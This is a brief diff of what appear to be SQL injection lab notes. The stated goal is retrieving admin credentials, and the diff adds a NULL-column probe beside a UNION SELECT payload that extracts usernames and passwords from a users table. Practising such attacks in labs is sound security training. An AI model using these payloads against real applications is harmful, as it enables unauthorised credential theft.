@@ -6,4 +6,5 @@ End Goal: Exploit SQL injection to retrieve the admin user's credentials from th
 
 Analysis:
 
+1 UNION SELECT NULL, NULL
 1 UNION SELECT username || '~'  || password  FROM users
